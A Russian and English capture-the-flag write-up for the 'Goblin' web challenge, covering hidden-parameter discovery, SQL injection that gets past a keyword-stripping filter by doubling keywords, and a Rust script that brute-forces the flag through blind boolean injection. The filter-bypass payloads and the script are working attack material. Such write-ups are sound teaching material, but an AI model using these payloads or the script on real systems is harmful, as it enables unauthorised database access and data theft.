# Goblin

> Да кому нужны эти рекурсии, хах? *(Я так и не понял про что это)*

---

> Who needs these recursions, huh? *(I still don't get what this is about)* *(EN version uses "huh" as opposed to "haha")*

## Решение / Solution

Страница встречает нас следующим текстом *(текст воссоздан по памяти)*:

```html
There is a hidden parameter somewhere...
```

Используя [Hidden-Parameter-Injector](https://github.com/RobertJonnyTiger/Hidden-Parameter-Injector)
найдем этот параметр:

```bash
$ python3 inject.py -u http://...

[>>] Listing all parameters from: common-params.txt
[>>] Starting parameters injection...

[>>] Injecting to: http://...
        [V] Accepted Parameter: id
```

Если его приписать в конец ссылки `?id`, то страница пишет, что пользователь не найден, а если дать
ему некоторое цифровое значение, то оно выводит профиль какого-то пользователя.

Дальше проверяем параметр на SQL Injection: приписываем `'`. MySQL сервера начинает ругаться на это,
а значит можно воспользоваться всем арсеналом этой атаки.

В ходе проверки некоторыми запросами, оказалось, что сервер имеет какую-то защиту в виде удаления
не понравившихся ей подстрок. Воспользуясь [подсказками от PortSwigger](https://portswigger.net/support/sql-injection-bypassing-common-filters),
получим следующие (или подобные) замены:

```sql
AND -> AANDND
FROM -> FRFROMOM
WHERE -> WHWHEREERE
SELECT -> SELSELECTECT
OR -> OORR
AS -> AASS
IF -> IIFF
  -> /**/
```

После удаления подстрок в строках справа, они будут преобразованы в нужные нам строки слева.

Например, для следующего запроса который мы будем использовать (между `1'...#`), соответствует
следующая замена:

```sql
and(select 1 from information_schema.tables where table_name like 'f%' limit 1)

aandnd(selselectect/**/1/**/from/**/infoorrmation_schema.tables/**/where/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
```

> [!IMPORTANT]
> `information_schema -> infoorrmation_schema`

Данный запрос отвечает, что пользователь не найден, если нет данных соответствующих `LIKE`.

С помощью ручного подбора через `information_schema.tables where table_name like '%flag%'` и
`information_schema.columns where table_name='flag' and column_name like '%flag%'` найдем таблицу
`flag` и столбец `flag`.

Дальше подбор вручную немножко нецелесообразен, так что напишем небольшую программку. Ниже приведен
код на Rust с использованием `regex` и `reqwest` (под `tokio`).

> [!NOTE]
> Поле `flag.flag` не имеет чувствительности к регистру. Флаг, надеюсь, тоже.

> [!WARNING]
> Перебор будет искать ключевые слова (например, `grodno{andandand...`), если делать замены до
> подстановки текущего варианта. Причиной этого является замена сервером строки на `grodno{`,
> которая является правильной под фильтром `LIKE`.

```rust
use regex::Regex;

#[tokio::main]
async fn main() {
    let url = format!(
        r#"http://.../?id=1'and(select 1 from flag where flag like "%AAA%" limit 1);"#
    );

    let alphabet = r#"abcdefghijklmnopqrstuvwxyz0123456789_{}"#;

    let mut cf = String::from("grodno{");

    let keywords = ["and", "from", "where", "select", "or", "as", "if"];

    'outer: loop {
        for c in alphabet.chars() {
            let curr_flag = format!("{}{}", cf, c);
            let mut url = url.replace("AAA", &curr_flag).replace(" ", "/**/");

            for keyword in keywords {
                // inefficient, move `Regex::new` to `keywords`
                let regex = Regex::new(&format!("(?i){}", keyword)).unwrap();
                
                // SELECT -> SSELECTELECT
                url = regex
                    .replace_all(
                        &url,
                        format!("{}{}{}", &keyword[0..1], keyword, &keyword[1..]),
                    )
                    .to_string();
            }

            let body = reqwest::get(url).await.unwrap().text().await.unwrap();
            if !body.contains("does not exist") {
                println!("{}", curr_flag);
                cf = curr_flag;
                continue 'outer;
            }
        }
    }
}
```

Флаг:

```plain
grodno{3asy_sq1i_h3h3}
```

---

The page greets us with the following text *(text recreated by memory)*:

```html
There is a hidden parameter somewhere...
```

Using [Hidden-Parameter-Injector](https://github.com/RobertJonnyTiger/Hidden-Parameter-Injector)
it can be found:

```bash
$ python3 inject.py -u http://...

[>>] Listing all parameters from: common-params.txt
[>>] Starting parameters injection...

[>>] Injecting to: http://...
        [V] Accepted Parameter: id
```

If `?id` is appended to the link, the page states that some user was not found, and if you give it
some number value, it outputs a profile of a matching user.

Next we check the parameter for SQL Injection: appending `'`. MySQL server starts complaining about
this, thus we can use the entirety of the attack's arsenal.

While trying some queries, it turns out, that the server has some kind of protection in the form of
deleting some substrings it does not like. Using [PortSwigger's hints](https://portswigger.net/web-security/sql-injection/bypass/1),
we get the following replacements:

```sql
AND -> AANDND
FROM -> FRFROMOM
WHERE -> WHWHEREERE
SELECT -> SELSELECTECT
OR -> OORR
AS -> AASS
IF -> IIFF
  -> /**/
```

After deleting the substrings in the strings at the right hand side, we will have the wanted strings
at the left hand side.

For example, for the following query which we will be using (between `1'...#`), we will have the
following replacement:

```sql
and(select 1 from information_schema.tables where table_name like 'f%' limit 1)

aandnd(selselectect/**/1/**/from/**/infoorrmation_schema.tables/**/where/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
```

> [!IMPORTANT]
> `information_schema -> infoorrmation_schema`

This query responds that user does not exist if there are no matches for the `LIKE` filter.

With a manual brute-force via `information_schema.tables where table_name like '%flag%'` and
`information_schema.columns where table_name='flag' and column_name like '%flag%'`, we find the
table `flag` and the column `flag`.

Next manual approach is a bit unwieldy, and it would make more sense to write a small program. Below
you can see Rust code that uses `regex` and `reqwest` (under `tokio`).

> [!NOTE]
> Field `flag.flag` is case-insensitive. Flag, I hope, too.

> [!WARNING]
> Brute-force will look for keywords (e.g. `grodno{andandand...`), if you perform replacements
> before substituting the current variant. This is because server will replace it by `grodno{`,
> which is valid under the `LIKE` filter.

```rust
use regex::Regex;

#[tokio::main]
async fn main() {
    let url = format!(
        r#"http://.../?id=1'and(select 1 from flag where flag like "%AAA%" limit 1);"#
    );

    let alphabet = r#"abcdefghijklmnopqrstuvwxyz0123456789_{}"#;

    let mut cf = String::from("grodno{");

    let keywords = ["and", "from", "where", "select", "or", "as", "if"];

    'outer: loop {
        for c in alphabet.chars() {
            let curr_flag = format!("{}{}", cf, c);
            let mut url = url.replace("AAA", &curr_flag).replace(" ", "/**/");

            for keyword in keywords {
                // inefficient, move `Regex::new` to `keywords`
                let regex = Regex::new(&format!("(?i){}", keyword)).unwrap();
                
                // SELECT -> SSELECTELECT
                url = regex
                    .replace_all(
                        &url,
                        format!("{}{}{}", &keyword[0..1], keyword, &keyword[1..]),
                    )
                    .to_string();
            }

            let body = reqwest::get(url).await.unwrap().text().await.unwrap();
            if !body.contains("does not exist") {
                println!("{}", curr_flag);
                cf = curr_flag;
                continue 'outer;
            }
        }
    }
}
```

Flag:

```plain
grodno{3asy_sq1i_h3h3}
```
